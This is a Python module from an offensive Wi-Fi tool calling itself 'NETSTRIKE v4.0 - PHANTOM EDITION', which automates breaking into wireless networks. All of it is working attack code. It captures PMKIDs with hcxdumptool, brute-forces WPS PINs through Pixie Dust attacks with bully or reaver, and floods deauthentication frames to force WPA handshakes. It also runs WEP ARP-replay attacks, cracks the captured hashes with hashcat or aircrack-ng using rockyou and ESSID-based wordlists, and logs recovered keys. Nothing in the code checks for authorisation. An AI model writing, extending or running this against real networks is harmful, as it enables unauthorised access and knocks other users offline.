#!/usr/bin/env python3
"""
NETSTRIKE v4.0 - PHANTOM EDITION
Password Cracker — PMKID, WPS, Handshake, WEP
"""

import os
import time
import threading


class PasswordCracker:
    def __init__(self, core, scanner):
        self.core           = core
        self.scanner        = scanner
        self.cracking_active = False

    # ═══════════════════════════════════════════════
    # AUTO CASCADE
    # ═══════════════════════════════════════════════

    def auto_crack_attack(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if not target:
            return

        print(f"\033[1;33m[🎯] Target: {target['essid']}\033[0m")

        # WEP takes a completely different path
        encryption = target.get('encryption', '')
        if 'WEP' in encryption and 'WPA' not in encryption:
            print("\033[1;33m[🗝️] WEP encryption detected — launching IV attack\033[0m")
            self.wep_attack(target)
            return

        print("\033[1;36m[⚡] PHANTOM cascade: PMKID → WPS → Handshake\033[0m")
        if not self._cascade(target):
            print("\033[1;31m[✘] All methods exhausted — no password found\033[0m")

    def _cascade(self, target):
        steps = [
            ("STEP 1: PMKID (clientless, stealth)", self.pmkid_attack),
            ("STEP 2: WPS Pixie Dust",               self.wps_assessment),
            ("STEP 3: Handshake + GPU brute force",  self.handshake_attack),
        ]
        for label, fn in steps:
            print(f"\n\033[1;36m[→] {label}\033[0m")
            if fn(target):
                return True
        return False

    # ═══════════════════════════════════════════════
    # PMKID
    # ═══════════════════════════════════════════════

    def pmkid_attack(self, target):
        bssid = target['bssid']
        clean = bssid.replace(':', '')

        pcapng  = f"/tmp/ns_pmkid_{clean}.pcapng"
        hc_out  = f"/tmp/ns_pmkid_{clean}.hc22000"
        filt    = f"/tmp/ns_filt_{clean}.txt"

        with open(filt, 'w') as f:
            f.write(clean + '\n')

        modern   = self._hcxdumptool_is_modern()
        if modern:
            dump_cmd = (
                f"timeout 60 hcxdumptool -i {self.core.mon_interface} "
                f"-o {pcapng} --filterlist_ap={filt} --filtermode_ap=2 2>/dev/null"
            )
        else:
            dump_cmd = (
                f"timeout 60 hcxdumptool -i {self.core.mon_interface} "
                f"-o {pcapng} --filterlist={filt} --filtermode=2 2>/dev/null"
            )

        print("\033[1;36m[→] Capturing PMKID (60 s)...\033[0m")
        self.core.run_command(dump_cmd, timeout=70)

        if not (os.path.exists(pcapng) and os.path.getsize(pcapng) > 100):
            print("\033[1;31m[✘] PMKID capture empty\033[0m")
            return False

        # Convert → hc22000
        converted = False
        if self._cmd_exists("hcxpcapngtool"):
            self.core.run_command(f"hcxpcapngtool -o {hc_out} {pcapng} 2>/dev/null")
            converted = os.path.exists(hc_out) and os.path.getsize(hc_out) > 0

        if not converted and self._cmd_exists("hcxpcaptool"):
            legacy = f"/tmp/ns_pmkid_{clean}.hash"
            self.core.run_command(f"hcxpcaptool -z {legacy} {pcapng} 2>/dev/null")
            if os.path.exists(legacy) and os.path.getsize(legacy) > 0:
                hc_out    = legacy
                converted = True

        if not converted:
            print("\033[1;31m[✘] PMKID conversion failed (hcxtools missing?)\033[0m")
            return False

        print("\033[1;32m[✓] PMKID hash ready\033[0m")
        return self._crack_hashcat(hc_out, 16800, target)

    def _hcxdumptool_is_modern(self):
        """
        Return True if hcxdumptool supports --filterlist_ap (v6+).
        Uses help-text feature detection — more reliable than version parsing.
        """
        r = self.core.run_command("hcxdumptool --help 2>&1")
        if r and "filterlist_ap" in r.stdout:
            return True
        # Fallback: version number check
        r = self.core.run_command("hcxdumptool --version 2>&1")
        if r and r.stdout:
            for tok in r.stdout.split():
                if tok and tok[0].isdigit():
                    try:
                        return int(tok.split('.')[0]) >= 6
                    except ValueError:
                        pass
        return False  # assume legacy / safe default

    # ═══════════════════════════════════════════════
    # WPS
    # ═══════════════════════════════════════════════

    def wps_assessment(self, target):
        print("\033[1;36m[→] Scanning for WPS...\033[0m")
        r = self.core.run_command(
            f"timeout 30 wash -i {self.core.mon_interface} -s -C 2>/dev/null"
        )
        if not (r and target['bssid'] in r.stdout):
            print("\033[1;31m[✘] WPS not available on target\033[0m")
            return False

        print("\033[1;32m[✓] WPS detected\033[0m")
        if self._cmd_exists("bully"):
            return self._bully_wps(target)
        elif self._cmd_exists("reaver"):
            return self._reaver_wps(target)
        else:
            print("\033[1;31m[✘] bully/reaver not found\033[0m")
            return False

    def _bully_wps(self, target):
        log  = "/tmp/ns_bully.log"
        proc = self.core.run_command(
            f"bully -b {target['bssid']} -c {target['channel']} "
            f"-d -v 3 {self.core.mon_interface} > {log} 2>&1",
            background=True
        )
        if not proc:
            return False

        print("\033[1;32m[⚡] Bully Pixie Dust running (3 min)...\033[0m")
        deadline = time.time() + 180
        while time.time() < deadline:
            if os.path.exists(log):
                with open(log, errors='replace') as f:
                    content = f.read()
                if "WPS PIN" in content or "PSK" in content:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                    return self._extract_wps_password(content, target)
            time.sleep(5)
        try:
            proc.terminate()
        except Exception:
            pass
        return False

    def _reaver_wps(self, target):
        log  = "/tmp/ns_reaver.log"
        proc = self.core.run_command(
            f"reaver -i {self.core.mon_interface} -b {target['bssid']} "
            f"-c {target['channel']} -vv -K 1 -N -A -d 2 > {log} 2>&1",
            background=True
        )
        if not proc:
            return False

        print("\033[1;32m[⚡] Reaver Pixie Dust running (5 min)...\033[0m")
        deadline = time.time() + 300
        while time.time() < deadline:
            if os.path.exists(log):
                with open(log, errors='replace') as f:
                    content = f.read()
                if "WPS PIN:" in content:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                    return self._extract_wps_password(content, target)
            time.sleep(5)
        try:
            proc.terminate()
        except Exception:
            pass
        return False

    def _extract_wps_password(self, content, target):
        for line in content.split('\n'):
            if "WPA PSK:" in line or "PSK:" in line:
                pw = line.split("PSK:")[-1].strip().strip("'\"")
                if pw:
                    print(f"\033[1;32m[🔓] WPS PASSWORD: {pw}\033[0m")
                    self.save_cracked_password(target, pw)
                    return True
        return False

    # ═══════════════════════════════════════════════
    # HANDSHAKE
    # ═══════════════════════════════════════════════

    def handshake_attack(self, target):
        bssid   = target['bssid']
        channel = target['channel']
        mon     = self.core.mon_interface
        hs_base = f"/tmp/ns_hs_{bssid.replace(':', '_')}"

        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")

        cap_proc = self.core.run_command(
            f"airodump-ng -c {channel} --bssid {bssid} "
            f"-w {hs_base} {mon}",
            background=True
        )

        self.cracking_active = False
        threading.Thread(
            target=self._deauth_for_hs, args=(target,), daemon=True
        ).start()

        print("\033[1;36m[→] Waiting for handshake (60 s)...\033[0m")
        cap_file = f"{hs_base}-01.cap"
        captured = False
        deadline = time.time() + 60

        while time.time() < deadline:
            if self._verify_handshake(cap_file, bssid):
                captured = True
                break
            time.sleep(3)

        self.cracking_active = True
        if cap_proc:
            try:
                cap_proc.terminate()
            except Exception:
                pass

        if not captured:
            print("\033[1;31m[✘] Handshake not captured\033[0m")
            return False

        print("\033[1;32m[✓] Handshake captured!\033[0m")

        hc22000 = f"/tmp/ns_{bssid.replace(':', '')}.hc22000"
        if self._cmd_exists("hcxpcapngtool") and self._convert_to_hc22000(cap_file, hc22000):
            return self._crack_hashcat(hc22000, 22000, target)
        else:
            return self._crack_aircrack(cap_file, target)

    def _deauth_for_hs(self, target):
        for _ in range(20):
            if self.cracking_active:
                break
            self.core.run_command(
                f"aireplay-ng --deauth 10 -a {target['bssid']} "
                f"{self.core.mon_interface} > /dev/null 2>&1"
            )
            time.sleep(3)

    def _verify_handshake(self, cap_file, bssid):
        if not os.path.exists(cap_file):
            return False
        r = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep -i '{bssid}'")
        return bool(r and "1 handshake" in r.stdout)

    def _convert_to_hc22000(self, cap_file, out_file):
        self.core.run_command(f"hcxpcapngtool -o {out_file} {cap_file} 2>/dev/null")
        return os.path.exists(out_file) and os.path.getsize(out_file) > 0

    # ═══════════════════════════════════════════════
    # WEP CRACKING
    # ═══════════════════════════════════════════════

    def wep_crack_menu(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if target:
            self.wep_attack(target)

    def wep_attack(self, target):
        """WEP IV collection via ARP replay + aircrack-ng"""
        bssid   = target['bssid']
        channel = target['channel']
        essid   = target['essid']
        mon     = self.core.mon_interface
        cap_base = f"/tmp/ns_wep_{bssid.replace(':', '')}"
        cap_file = f"{cap_base}-01.cap"

        print(f"\033[1;36m[🗝️] WEP attack: {essid}\033[0m")
        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
        time.sleep(0.5)

        # Start IV capture
        cap_proc = self.core.run_command(
            f"airodump-ng -c {channel} --bssid {bssid} -w {cap_base} {mon}",
            background=True
        )

        # Fake authentication
        self.core.run_command(
            f"aireplay-ng -1 0 -e {essid} -a {bssid} {mon} > /dev/null 2>&1",
            timeout=15
        )
        time.sleep(2)

        # ARP replay to generate IVs
        replay_proc = self.core.run_command(
            f"aireplay-ng -3 -b {bssid} {mon}",
            background=True
        )

        print("\033[1;36m[→] Collecting IVs via ARP replay (max 5 min)...\033[0m")
        print("\033[1;33m[!] Trying aircrack-ng every 30 s\033[0m")

        deadline = time.time() + 300
        cracked  = False

        while time.time() < deadline:
            time.sleep(30)
            if not os.path.exists(cap_file):
                continue
            r = self.core.run_command(
                f"aircrack-ng -b {bssid} {cap_file} 2>/dev/null",
                timeout=30
            )
            if r and "KEY FOUND" in r.stdout:
                for line in r.stdout.split('\n'):
                    if "KEY FOUND" in line:
                        key = line.split('[')[-1].rstrip(']').strip()
                        print(f"\033[1;32m[🔓] WEP KEY: {key}\033[0m")
                        self.save_cracked_password(target, key)
                        cracked = True
                        break
                if cracked:
                    break

        for p in [cap_proc, replay_proc]:
            if p:
                try:
                    p.terminate()
                except Exception:
                    pass

        if not cracked:
            print("\033[1;31m[✘] WEP crack failed (not enough IVs)\033[0m")
        return cracked

    # ═══════════════════════════════════════════════
    # CRACKING ENGINES
    # ═══════════════════════════════════════════════

    def _crack_hashcat(self, hash_file, mode, target):
        """
        Run hashcat then read result via --show (potfile).
        Supports mode 16800 (PMKID) and 22000 (WPA).
        """
        wordlists = self._wordlists(target['essid'])

        # Find best available rules file
        rules = ""
        for rule_path in [
            "/usr/share/hashcat/rules/best64.rule",
            "/usr/share/hashcat/rules/rockyou-30000.rule",
            "/usr/share/hashcat/rules/d3ad0ne.rule",
        ]:
            if os.path.exists(rule_path):
                rules = f"-r {rule_path}"
                break

        for name, path in wordlists.items():
            if not (path and os.path.exists(path)):
                continue
            print(f"\033[1;36m[→] Hashcat [{name}] mode {mode}...\033[0m")

            self.core.run_command(
                f"hashcat -m {mode} {hash_file} {path} {rules} "
                f"-O -w 3 --force -q 2>/dev/null",
                timeout=600
            )

            pw = self._hashcat_show(hash_file, mode)
            if pw:
                print(f"\033[1;32m[🎉] CRACKED: {pw}\033[0m")
                self.save_cracked_password(target, pw)
                return True

        return False

    def _hashcat_show(self, hash_file, mode):
        """Read cracked password from potfile via hashcat --show"""
        r = self.core.run_command(
            f"hashcat -m {mode} {hash_file} --show 2>/dev/null"
        )
        if r and r.stdout.strip():
            for line in r.stdout.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                idx = line.rfind(':')
                if idx != -1:
                    pw = line[idx + 1:].strip()
                    if pw:
                        return pw
        return None

    def _crack_aircrack(self, cap_file, target):
        """CPU fallback via aircrack-ng"""
        wordlists   = self._wordlists(target['essid'])
        result_file = "/tmp/ns_ac_result.txt"

        for name, path in wordlists.items():
            if not (path and os.path.exists(path)):
                continue
            print(f"\033[1;36m[→] aircrack-ng [{name}]...\033[0m")

            if os.path.exists(result_file):
                os.remove(result_file)

            self.core.run_command(
                f"aircrack-ng -w {path} -b {target['bssid']} {cap_file} "
                f"-l {result_file} -q 2>/dev/null",
                timeout=600
            )

            if os.path.exists(result_file):
                with open(result_file) as f:
                    pw = f.read().strip()
                if pw:
                    print(f"\033[1;32m[🎉] CRACKED: {pw}\033[0m")
                    self.save_cracked_password(target, pw)
                    return True

        return False

    # ═══════════════════════════════════════════════
    # STANDALONE MENUS
    # ═══════════════════════════════════════════════

    def handshake_capture_menu(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if target:
            self.handshake_attack(target)

    def wps_pin_attack(self):
        if not self.scanner.wifi_scan():
            return
        self.scanner.display_scan_results()
        target = self.scanner.select_target()
        if target:
            self.wps_assessment(target)

    # ═══════════════════════════════════════════════
    # WORDLISTS
    # ═══════════════════════════════════════════════

    def _wordlists(self, essid=""):
        return {
            "Custom":  self._build_custom(essid),
            "RockYou": self._rockyou(),
            "Common":  self._common(),
        }

    def _build_custom(self, essid):
        path = "/tmp/ns_custom.txt"
        base = [
            "12345678", "password", "admin123", "welcome", "qwerty",
            "letmein", "123456789", "1234567890", "internet", "wireless",
            "default", "guest", "linksys", "dlink", "netgear", "cisco",
            "router", "password1", "pass1234", "home1234", "wifi1234",
            "admin", "root", "toor", "changeme", "abc12345",
        ]
        if essid and "HIDDEN" not in essid:
            clean = essid.replace('_', '').replace('-', '').replace(' ', '')
            for suffix in ["", "123", "1234", "12345", "2024", "2025", "!", "@", "#", "1"]:
                for variant in [essid, clean, essid.lower(), essid.upper()]:
                    candidate = variant + suffix
                    if candidate not in base:
                        base.append(candidate)
        seen, unique = set(), []
        for p in base:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        try:
            with open(path, 'w') as f:
                f.write('\n'.join(unique) + '\n')
            return path
        except Exception:
            return None

    def _rockyou(self):
        for p in [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
        ]:
            if os.path.exists(p):
                if p.endswith('.gz'):
                    out = "/tmp/rockyou.txt"
                    if not os.path.exists(out):
                        self.core.run_command(f"gzip -dc {p} > {out} 2>/dev/null", timeout=90)
                    return out if os.path.exists(out) else None
                return p
        return None

    def _common(self):
        path = "/tmp/ns_common.txt"
        if os.path.exists(path):
            return path
        passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "dragon", "123123", "admin",
            "abc123", "superman", "iloveyou", "monkey", "1234567890",
            "passw0rd", "master", "hello", "freedom", "trustno1",
        ]
        try:
            with open(path, 'w') as f:
                f.write('\n'.join(passwords) + '\n')
            return path
        except Exception:
            return None

    # ═══════════════════════════════════════════════
    # HELPERS
    # ═══════════════════════════════════════════════

    def _cmd_exists(self, cmd):
        r = self.core.run_command(f"command -v {cmd} 2>/dev/null")
        return bool(r and r.stdout.strip())

    def save_cracked_password(self, target, password):
        try:
            with open("/tmp/ns_cracked.txt", "a") as f:
                f.write(
                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]"
                    f"  SSID: {target['essid']}"
                    f"  |  BSSID: {target['bssid']}"
                    f"  |  Password: {password}\n"
                )
            print("\033[1;32m[💾] Saved to /tmp/ns_cracked.txt\033[0m")
        except Exception:
            pass
